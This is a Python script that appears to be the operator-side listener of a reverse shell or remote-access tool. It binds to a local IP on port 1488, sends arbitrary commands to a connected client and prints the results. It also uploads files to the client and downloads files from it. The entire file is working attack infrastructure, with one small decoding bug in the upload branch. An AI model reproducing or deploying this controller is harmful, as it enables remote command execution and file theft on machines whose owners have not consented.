import socket
from threading import Thread
import os
import sys

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

stack = []

host, port = '192.168.1.23', 1488
s.bind((host, port))
s.listen(0)


def start_client(client, addr):
    print(f"new connection: {addr}")
    while True:
        try:
            command = input(f"command@{addr[0]}:~$ ")
            while not command:
                command = input(f"command@{addr[0]}:~$ ")
            
            if command.startswith("/sendfile "):
                if len(command.split()) == 2:
                    path = command.split()[1]
                    if not os.path.exists(path):
                        print("[-] File does not exist [-]")
                        continue
                    client.send("/sendfile".encode("cp866"))
                    client.recv(1024)
                    client.send(os.path.basename(path).encode("cp866"))
                    client.recv(1024)
                    file_size = os.path.getsize(path)
                    client.send(str(file_size).encode("cp866"))
                    client.recv(1024)
                    total_sent = 0
                    with open(path, 'rb') as file:
                        
                        while total_sent < file_size:
                            data = file.read(4096)
                            client.send(data)
                            total_sent += len(data)
                            a = round(20 * total_sent / file_size)
                            progress = "#" * a + "." * (20-a) + f" sended {total_sent} / {file_size} bytes"
                            print(progress, end='\r')

                    a = round(20 * total_sent / file_size)
                    progress = "#" * a + "." * (20-a) + f" sended {total_sent} / {file_size} bytes"
                    print(progress, end='\r')
                    print()
                    response = client.recv(1024).decode("cp866")
                    print(response.decode("cp866"))
                    
                else:
                    print('Use it like "/sendfile [filename]"')
            elif command.startswith("/getfile "):
                if len(command.split()) == 2:
                    path = command.split()[1]
                    client.send("/getfile".encode("cp866"))
                    client.recv(1024)
                    client.send(path.encode("cp866"))

                    file_size_msg = client.recv(1024).decode("cp866")
                    if file_size_msg == "File not found":
                        print("[-] File not found on client [-]")
                        continue
                    
                    file_size = int(file_size_msg)
                    client.send(b"ready")
                    received_size = 0
                    with open(os.path.basename(path), "wb") as file:
                        while received_size < file_size:
                            data = client.recv(min(4096, file_size - received_size))
                            a = round(20 * received_size / file_size)
                            progress = "#" * a + "." * (20-a) + f" received {received_size} / {file_size} bytes"
                            print(progress, end='\r')
                            if not data:
                                break
                            file.write(data)
                            received_size += len(data)
                    a = round(20 * received_size / file_size)
                    progress = "#" * a + "." * (20-a) + f" received {received_size} / {file_size} bytes"
                    print(progress, end='\r')
                    print()
                            
                    if received_size == file_size:
                        client.send(f"[+] File '{os.path.basename(path)}' successfully received ({received_size} bytes) [+]".encode("cp866"))
                        print(f"[+] File '{os.path.basename(path)}' successfully received ({received_size} bytes) [+]")
                    else:
                        client.send(f"[!] File transfer incomplete. Received {received_size}/{file_size} bytes [!]".encode("cp866"))
                        print(f"[!] File transfer incomplete. Received {received_size}/{file_size} bytes [!]")
                else:
                    print('Use it like "/getfile [file path]"')
            elif command == "clear":
                if sys.platform == 'win32':
                    os.system('cls')
                else:
                    os.system('clear')
            else:
                client.send(command.encode("cp866"))
                response = client.recv(1024**2)
                print(response.decode("cp866"))
                
        except Exception as ex:
            print(ex)
            break
    
    if client in stack:
        stack.remove(client)
    client.close()
    print(f'CONNECTION FROM {addr} CLOSED')


while True:
    if not stack:
        conn, addr = s.accept()
        conn.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        stack.append(conn)
        Thread(target=lambda: start_client(conn, addr)).start()
